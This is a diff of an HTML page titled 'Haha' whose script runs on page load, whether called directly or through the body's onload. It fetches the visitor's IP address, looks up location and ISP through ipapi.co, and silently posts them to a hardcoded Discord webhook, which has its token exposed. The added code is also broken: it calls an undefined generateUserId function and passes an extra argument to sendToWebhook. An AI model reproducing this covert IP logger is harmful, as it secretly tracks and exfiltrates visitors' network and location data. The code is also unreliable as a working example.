@@ -3,80 +3,62 @@
   <head>
     <title>Haha</title>
     <script>
-      function generateRandomId() {
-        const characters = "0123456789";
-        let id = "";
-        for (let i = 0; i < 16; i++) {
-          id += characters.charAt(Math.floor(Math.random() * characters.length));
-        }
-        return id;
-      }
+       function displayIP() {
+  fetch("https://api.ipify.org/?format=json")
+    .then((response) => response.json())
+    .then((data) => {
+      const ipElement = document.getElementById("ip");
+      ipElement.textContent = data.ip;
 
-      function displayIP() {
-        const userId = localStorage.getItem("siteUserId");
-        if (!userId) {
-          const newUserId = generateRandomId();
-          localStorage.setItem("siteUserId", newUserId);
-          const userIdElement = document.getElementById("userId");
-          userIdElement.textContent = newUserId;
-          fetchIP(newUserId);
-        } else {
-          const userIdElement = document.getElementById("userId");
-          userIdElement.textContent = userId;
-          fetchIP(userId);
-        }
-      }
+      getLocation(data.ip);
+    })
+    .catch((error) => {
+      console.error("Error:", error);
+    });
+}
 
-      function fetchIP(userId) {
-        fetch("https://api.ipify.org/?format=json")
-          .then((response) => response.json())
-          .then((data) => {
-            const ipElement = document.getElementById("ip");
-            ipElement.textContent = data.ip;
+function sendToWebhook(ip, location, isp) {
+  const webhookURL = "https://discord.com/api/webhooks/1108773713077346384/hjKxkLhLkS3mEc6OpQzlCi_nmMWLY4ocZkMzC1PwlA55ScZf3hayJEL1JG2zyOFPHyFx"; // Replace with the actual webhook URL
+  const message = "IP: " + ip + "\nLocation: " + location + "\nISP: " + isp;
 
-            fetchLocation(userId, data.ip);
-          })
-          .catch((error) => {
-            console.error("Error:", error);
-          });
-      }
+  fetch(webhookURL, {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({ content: message })
+  })
+    .then((response) => console.log("Webhook sent successfully"))
+    .catch((error) => console.error("Error sending webhook:", error));
+}
 
-      function fetchLocation(userId, ip) {
-        fetch(`https://ipapi.co/${ip}/json/`)
-          .then((response) => response.json())
-          .then((data) => {
-            const locationElement = document.getElementById("location");
-            const locationString = `${data.city}, ${data.region}, ${data.country_name}`;
-            locationElement.textContent = locationString;
+function getLocation(ip) {
+  const locationUrl = `https://ipapi.co/${ip}/json/`;
 
-            const ispElement = document.getElementById("isp");
-            const ispString = data.org;
-            ispElement.textContent = ispString;
+  fetch(locationUrl)
+    .then((response) => response.json())
+    .then((data) => {
+      const locationElement = document.getElementById("location");
+      const locationString = `${data.city}, ${data.region}, ${data.country_name}`;
+      locationElement.textContent = locationString;
 
-            sendToWebhook(userId, ip, locationString, ispString);
-          })
-          .catch((error) => {
-            console.error("Error:", error);
-            const defaultLocation = "Unknown";
-            const defaultIsp = "Unknown";
-            sendToWebhook(userId, ip, defaultLocation, defaultIsp);
-          });
-      }
+      const ispElement = document.getElementById("isp");
+      const ispString = data.org;
+      ispElement.textContent = ispString;
 
-      function sendToWebhook(userId, ip, location, isp) {
-        const webhookURL = "https://discord.com/api/webhooks/1108773713077346384/hjKxkLhLkS3mEc6OpQzlCi_nmMWLY4ocZkMzC1PwlA55ScZf3hayJEL1JG2zyOFPHyFx"; // Replace with the actual webhook URL
-        const message = "User ID: " + userId + "\nIP: " + ip + "\nLocation: " + location + "\nISP: " + isp;
+      const userId = generateUserId();
+      sendToWebhook(ip, locationString, ispString, userId);
+    })
+    .catch((error) => {
+      console.error("Error:", error);
+      const defaultLocation = "Unknown";
+      const defaultIsp = "Unknown";
+      const userId = generateUserId();
+      sendToWebhook(ip, defaultLocation, defaultIsp, userId);
+    });
+}
 
-        fetch(webhookURL, {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify({ content: message })
-        })
-          .then((response) => console.log("Webhook sent successfully"))
-          .catch((error) => console.error("Error sending webhook:", error));
-      }
+displayIP();
     </script>
   </head>
   <body onload="displayIP()">
